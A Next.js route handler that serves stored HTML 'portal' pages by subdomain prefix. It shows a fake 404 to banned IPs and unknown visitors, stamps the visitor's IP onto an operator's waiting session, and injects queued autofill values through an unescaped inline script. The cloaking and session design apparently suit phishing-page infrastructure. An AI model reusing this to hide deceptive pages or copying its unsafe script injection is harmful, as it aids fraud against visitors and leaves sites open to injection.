import { NextRequest, NextResponse } from "next/server";
import { supabaseAdmin } from "@/integrations/supabase/admin";

function faux404() {
  return new NextResponse(
    `<!doctype html><html><head><title>404 Not Found</title></head><body style="font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f8fafc;color:#334155"><div style="text-align:center"><h1 style="font-size:4rem;margin:0;font-weight:700">404</h1><p style="color:#64748b">This page could not be found.</p></div></body></html>`,
    { status: 404, headers: { "Content-Type": "text/html" } },
  );
}

interface SubdomainRow {
  id: string;
  html_sites: { storage_path: string } | null;
}

export async function GET(req: NextRequest) {
  const prefix = req.nextUrl.searchParams.get("s");
  if (!prefix) return faux404();

  const clientIp =
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
    req.headers.get("x-real-ip") ??
    null;

  try {
    // IP ban check — banned visitors see the same faux 404 as everyone else.
    if (clientIp) {
      const { data: bans } = await supabaseAdmin
        .from("bans")
        .select("id, expires_at")
        .eq("ip", clientIp);

      const banned = (bans ?? []).some(
        (b) => !b.expires_at || new Date(b.expires_at).getTime() > Date.now(),
      );
      if (banned) return faux404();
    }

    const { data: subRaw, error: subError } = await supabaseAdmin
      .from("subdomains")
      .select("id, html_sites(storage_path)")
      .eq("prefix", prefix)
      .eq("status", "active")
      .maybeSingle();

    if (subError) throw subError;

    const sub = subRaw as unknown as SubdomainRow | null;
    if (!sub?.html_sites?.storage_path) return faux404();

    const { data: file, error: downloadError } = await supabaseAdmin.storage
      .from("portals")
      .download(sub.html_sites.storage_path);

    if (downloadError || !file) return faux404();

    let html = await file.text();

    // Activate the newest waiting session for this portal and stamp the client IP.
    const { data: waiting } = await supabaseAdmin
      .from("sessions")
      .select("id, autofill")
      .eq("subdomain_id", sub.id)
      .eq("status", "waiting")
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    if (waiting) {
      await supabaseAdmin
        .from("sessions")
        .update({ status: "active", client_ip: clientIp })
        .eq("id", waiting.id);

      // Hand queued autofill values to the portal page.
      const autofill = (waiting.autofill as Record<string, unknown>) ?? {};
      const inject = `<script>window.__PAL_SESSION__=${JSON.stringify(
        waiting.id,
      )};window.__PAL_AUTOFILL__=${JSON.stringify(autofill)};</script>`;
      html = html.includes("</body>")
        ? html.replace("</body>", `${inject}</body>`)
        : html + inject;
    }

    return new NextResponse(html, {
      headers: { "Content-Type": "text/html", "Cache-Control": "no-store" },
    });
  } catch (err) {
    console.error(
      "[router] Error:",
      err instanceof Error ? err.message : String(err),
    );
    return faux404();
  }
}